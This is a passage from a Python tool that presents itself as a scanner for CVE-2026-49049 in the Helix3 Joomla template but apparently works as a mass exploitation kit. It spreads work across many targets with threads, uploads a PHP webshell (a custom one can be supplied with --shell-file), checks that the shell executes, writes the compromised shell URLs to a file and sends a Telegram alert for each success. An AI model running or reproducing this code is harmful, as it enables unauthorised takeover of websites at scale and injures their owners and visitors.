        # Step 5 - Telegram notification
        self._notify_telegram(result)

        result.elapsed_seconds = time.time() - start_time
        return result

    def _notify_telegram(self, result: ScanResult) -> None:
        """Send Telegram alert ONLY when shell EXECUTED (web-accessible + PHP ran)."""
        if not result.shell_url or not result.shell_executed:
            return
        msg = f"<b>sky1337 Upload (EXECUTED)</b>\n"
        msg += f"<b>Target:</b> {result.url}\n"
        msg += f"<b>CVE:</b> CVE-2026-49049 (Helix3 unauth AJAX)\n"
        if result.helix3_version:
            msg += f"<b>Helix3:</b> v{result.helix3_version}\n"
        ep = []
        if result.save_endpoint: ep.append("save")
        if result.remove_endpoint: ep.append("remove")
        if result.import_endpoint: ep.append("import")
        msg += f"<b>Endpoints:</b> {', '.join(ep)}\n"
        msg += f"<b>Shell:</b> <code>{result.shell_url}</code>\n"
        msg += f"<b>Executed:</b> <b>{'YES' if result.shell_executed else 'NO'}</b>\n"
        msg += f"<b>Time:</b> {result.elapsed_seconds:.1f}s"
        send_telegram(msg)


# ---------------------------------------------------------------------------
# Mass Scanner
# ---------------------------------------------------------------------------

class MassScanner:
    """Scans multiple targets concurrently using a thread pool."""

    def __init__(
        self,
        targets: List[str],
        threads: int = DEFAULT_THREADS,
        output_path: Optional[str] = None,
        verbose: bool = False,
        custom_shell: Optional[bytes] = None,
    ) -> None:
        self._targets = targets
        self._threads = threads
        self._verbose = verbose
        self._custom_shell = custom_shell
        self._results: List[ScanResult] = []
        self._output = OutputWriter(output_path) if output_path else None

    def run(self) -> List[ScanResult]:
        total = len(self._targets)

        print(f"\n{'-' * 60}")
        print(f"  CVE-2026-49049 | Targets: {total} | Threads: {self._threads}")
        if self._output:
            print(f"  Output : {self._output._path}")
        print(f"  Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'-' * 60}\n")

        with ThreadPoolExecutor(max_workers=self._threads) as executor:
            future_map = {
                executor.submit(self._scan_one, target): target
                for target in self._targets
            }
            for future in as_completed(future_map):
                try:
                    result = future.result()
                except Exception as exc:
                    original = future_map[future]
                    result = ScanResult(
                        host=str(original),
                        status="error",
                        error_message=str(exc),
                    )
                self._results.append(result)
                self._print(result)
                if self._output:
                    self._output.write(result)

        if self._output:
            self._output.write_summary(self._results)

        return self._results

    def _scan_one(self, target: str) -> ScanResult:
        clean = target.strip().rstrip("/")
        clean = re.sub(r"^https?://", "", clean)
        clean = clean.split("/")[0]  # keep host:port, strip path
        return Helix3Scanner(verbose=self._verbose, custom_shell=self._custom_shell).scan(clean)

    @staticmethod
    def _print(result: ScanResult) -> None:
        tags = {
            "vulnerable":       "[VULN]",
            "write_only":       "[WRITE]",
            "patched":          "[ OK ]",
            "not_helix3":       "[  - ]",
            "not_joomla":       "[  - ]",
            "endpoint_blocked": "[  ! ]",
            "error":            "[ ERR]",
        }
        tag = tags.get(result.status, "[  ? ]")
        version = f"v{result.helix3_version}" if result.helix3_version else "?"

        print(f"  {tag}  {result.host:40s}  {version:10s}  {result.elapsed_seconds:5.1f}s")

        if result.status in ("vulnerable", "write_only"):
            save = "YES" if result.save_endpoint else " NO"
            rmv  = "YES" if result.remove_endpoint else " NO"
            imp  = "YES" if result.import_endpoint else " NO"
            print(f"        save: {save}    remove: {rmv}    import: {imp}")
            if result.shell_url:
                ex = "EXEC" if result.shell_executed else "NO-EXEC"
                print(f"        shell: {ex}  {result.shell_url}")
            elif result.shell_written:
                print(f"        shell: WRITTEN (not web-accessible)")
            else:
                print(f"        shell: (not found)")

    def save_json_report(self, path: str) -> Dict[str, Any]:
        """Write structured scan results to a JSON file."""
        report = {
            "cve": "CVE-2026-49049",
            "component": "Helix3 (JoomShaper)",
            "scan_date": datetime.now().isoformat(),
            "num_targets": len(self._results),
            "num_vulnerable": sum(1 for r in self._results if r.is_vulnerable),
            "targets": [],
        }
        for r in self._results:
            report["targets"].append({
                "host": r.host,
                "status": r.status,
                "helix3_version": r.helix3_version,
                "vulnerable": r.is_vulnerable,
                "save_endpoint": r.save_endpoint,
                "remove_endpoint": r.remove_endpoint,
                "import_endpoint": r.import_endpoint,
                "shell_uploaded": r.shell_uploaded,
                "shell_executed": r.shell_executed,
                "shell_url": r.shell_url,
                "error": r.error_message,
                "elapsed": round(r.elapsed_seconds, 1),
            })

        with open(path, "w") as fh:
            json.dump(report, fh, indent=2)

        print(f"\n  Report saved to: {path}")
        print(f"  Targets  : {report['num_targets']}")
        print(f"  Vulnerable: {report['num_vulnerable']}\n")

        # Print + save shell links for executed/uploaded shells
        shell_hosts = [r for r in self._results if r.shell_url]
        if shell_hosts:
            print(f"{'-' * 60}")
            print(f"  SHELL LINKS ({len(shell_hosts)})")
            print(f"{'-' * 60}")
            with open("shell_links.txt", "w") as sf:
                for r in shell_hosts:
                    ex = "EXEC" if r.shell_executed else "NO-EXEC"
                    line = f"[{ex}] {r.shell_url}"
                    print(f"  {line}")
                    sf.write(f"{r.shell_url}\n")
            print(f"\n  Shell links saved to: shell_links.txt\n")

        return report


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------

BANNER = """
    CVE-2026-49049 - Helix3 (JoomShaper)
    Joomla Unauthenticated AJAX Handler Scanner
"""


def main() -> None:
    global REQUEST_TIMEOUT
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="CVE-2026-49049 - Helix3 Vulnerability Scanner",
        epilog=(
            "Examples:\n"
            "  python cve-2026-49049.py -t 192.168.1.1\n"
            "  python cve-2026-49049.py -f targets.txt -o results.txt\n"
            "  python cve-2026-49049.py -f targets.txt --json report.json -v"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-t", "--target", help="Single target (domain or IP)")
    parser.add_argument("-f", "--file", help="File containing targets, one per line")
    parser.add_argument("-o", "--output", default="cve-2026-49049_scan.txt",
                        help="Real-time text output file")
    parser.add_argument("--json", default="cve-2026-49049_report.json",
                        help="Structured JSON report file")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                        help=f"Number of concurrent workers (default: {DEFAULT_THREADS})")
    parser.add_argument("--timeout", type=int, default=REQUEST_TIMEOUT,
                        help=f"HTTP request timeout in seconds (default: {REQUEST_TIMEOUT})")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show probe details for each target")
    parser.add_argument("--shell-file", help="Custom PHP webshell to upload via save action")
    parser.add_argument("--tg-token", help="Telegram bot token for notifications")
    parser.add_argument("--tg-chat", help="Telegram chat ID for notifications")
    args = parser.parse_args()

    # Update module-level timeout if the user overrides it
    if args.timeout != REQUEST_TIMEOUT:
        REQUEST_TIMEOUT = args.timeout

    # Telegram config
    global TELEGRAM_TOKEN, TELEGRAM_CHAT_ID
    TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN") or args.tg_token
    TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID") or args.tg_chat
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        print(f"  Telegram notifications: enabled")
    else:
        print(f"  Telegram notifications: disabled")

    # Load custom shell
    custom_shell: Optional[bytes] = None
    if args.shell_file:
        try:
            with open(args.shell_file, "rb") as fh:
                custom_shell = fh.read()
            print(f"  Custom webshell loaded ({len(custom_shell)} bytes): {args.shell_file}")
        except OSError as exc:
            print(f"[!] Cannot read shell file {args.shell_file}: {exc}")
            sys.exit(1)

    # Collect targets
    targets: List[str] = []
    if args.target:
        targets.append(args.target)
    if args.file:
        if not os.path.isfile(args.file):
            print(f"[!] File not found: {args.file}")
            sys.exit(1)
        with open(args.file) as fh:
            for line in fh:
                stripped = line.strip()
                if stripped and not stripped.startswith("#"):
                    targets.append(stripped)

    if not targets:
        parser.print_help()
        print("\n[!] Specify at least one target (-t or -f)")
        sys.exit(1)

    targets = list(dict.fromkeys(targets))  # deduplicate, preserve order

    # Single-target mode
    if len(targets) == 1 and not args.file:
        scanner = Helix3Scanner(verbose=args.verbose, custom_shell=custom_shell)
        result = scanner.scan(targets[0])

        print(f"\n  Host      : {result.host}")
        print(f"  Status    : {result.status}")
        print(f"  Helix3    : {result.helix3_version or 'N/A'}")
        print(f"  Vulnerable: {'YES' if result.is_vulnerable else 'NO'}")
        print(f"  save      : {'YES' if result.save_endpoint else 'NO'}")
        print(f"  remove    : {'YES' if result.remove_endpoint else 'NO'}")
        print(f"  import    : {'YES' if result.import_endpoint else 'NO'}")
        if result.shell_url:
            print(f"  Shell     : {'EXEC' if result.shell_executed else 'NO-EXEC'} {result.shell_url}")
        if result.error_message:
            print(f"  Error     : {result.error_message}")
        print(f"  Time      : {result.elapsed_seconds:.1f}s\n")
        return

    # Mass-scan mode
    print(f"\n  {len(targets)} target(s) loaded\n")
    mass = MassScanner(
        targets=targets,
        threads=args.threads,
        output_path=args.output,
        verbose=args.verbose,
        custom_shell=custom_shell,
    )
    mass.run()
    mass.save_json_report(args.json)


if __name__ == "__main__":
    main()
